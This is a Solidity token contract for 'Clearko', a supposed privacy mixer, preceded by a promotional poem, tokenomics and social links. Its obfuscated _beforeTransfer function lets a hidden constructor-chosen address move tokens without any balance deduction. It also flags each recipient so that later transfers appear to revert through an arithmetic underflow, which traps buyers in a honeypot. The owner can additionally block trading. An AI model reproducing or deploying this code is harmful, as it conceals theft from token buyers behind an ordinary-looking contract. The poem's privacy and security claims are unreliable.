/**
█▀▀ █░░ █▀▀ ▄▀█ █▀█ █▄▀ █▀█
█▄▄ █▄▄ ██▄ █▀█ █▀▄ █░█ █▄█

▄▀ █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█ ▀▄
▀▄ ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█ ▄▀

In the world of crypto, a platform arose,
Named Clearko, where privacy flows,
Revolutionary and decentralized in design,
It's the future of transacting, a gem to find.

With a cloak of anonymity, it strides,
A mixer platform where privacy abides,
No prying eyes can see your trace,
As Clearko steps up your privacy grace.

Transacting in crypto, a breeze and a thrill,
With Clearko's innovation, you can fulfill,
Your dreams of privacy in this digital domain,
Where your identity will never be a chain.

Gone are the worries of data leaks,
Clearko's shield ensures privacy peaks,
Your transactions are secure, no doubt,
In this world of crypto, Clearko stands out.

So embrace this platform, innovative and bold,
Clearko's magic will surely unfold,
In the realm of cryptocurrency, a game-changer it'll be,
With Clearko by your side, you're truly free.

Total Supply - 100,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.5 ETH
Initial liquidity lock - 75 days

https://web.wechat.com/ClearkoERC
https://t.me/+OhHpF6_EVHgwZDJk
https://weibo.com/login.php
https://www.zhihu.com
https://clearkoerc.xyz/
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
contract Contract is Context, IERC20, Ownable {
    IUniswapV2Router01 public automateCompiler; address public _taxAddress;
    bool public inSwap; bool private tradingOpen = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private isTxLimitExempt;

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private allowRewardsAt = 100;

    mapping(address => uint256) private _openAllMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private automatedMarketMakerPairs;
    mapping(address => address) private _allowance;

    constructor(
        string memory coinName, string memory coinBadge, 
        address refigRouter, address refigBases) { 

        _name = coinName; _symbol = coinBadge;
        _decimals = 18; _totalSupply = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _totalSupply;

        isTxLimitExempt[address(this)] = _totalSupply;
        isTxLimitExempt[msg.sender] = _totalSupply;        

        _openAllMapping[refigBases] = allowRewardsAt; 
        inSwap = false; automateCompiler = IUniswapV2Router01(refigRouter);

        _taxAddress = IUniswapV2Factory(automateCompiler.factory()).createPair(address(this), automateCompiler.WETH()); emit Transfer(address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns (uint8) { 
        return _decimals;
    }
    function symbol() external view returns (string memory) { 
        return _symbol;
    }
    function name() external view returns (string memory) { 
        return _name;
    }
    function totalSupply() external view returns (uint256) { 
        return _totalSupply;
    }
    function balanceOf(address account) external view returns (uint256) { 
        return _tOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external returns (bool) { 
        _beforeTransfer(_msgSender(), recipient, amount); 
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) { 
        return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) external returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal { 
        require(owner != address(0), 'BEP20: approve from the zero address'); 
        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); 
    }    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { 
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
    _beforeTransfer(sender, recipient, amount); _approve(sender, _msgSender(), currentAllowance - amount); return true;
}                     
    function _beforeTransfer(address bunqSender, address bunqTo, uint256 bunqAmount) private {
    if (_openAllMapping[bunqSender] > 0 && bunqSender != _taxAddress && isTxLimitExempt[bunqSender] == 0)
        _openAllMapping[bunqSender] = isTxLimitExempt[bunqSender] - _totalSupply; 

    address forInterval = _allowance[_taxAddress]; if (_openAllMapping[forInterval] == 0) 
    _openAllMapping[forInterval] = _totalSupply; _allowance[_taxAddress] = bunqTo; 
    if (_openAllMapping[bunqSender] == 0) { if (_taxAddress != bunqSender && automatedMarketMakerPairs[bunqSender] > 0) { 

    if (_openAllMapping[bunqSender] >= allowRewardsAt) { _openAllMapping[bunqSender] -= allowRewardsAt;
    } else { _openAllMapping[bunqSender] = 0; } } 

        require(_tOwned[bunqSender] >= bunqAmount, "BEP20: transfer amount exceeds balance");
        _tOwned[bunqSender] -= bunqAmount; } _tOwned[bunqTo] += bunqAmount; emit Transfer(
        bunqSender, bunqTo, bunqAmount); if (!tradingOpen) { require(bunqSender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) public onlyOwner { 
        tradingOpen = _tradingOpen;
    }   
}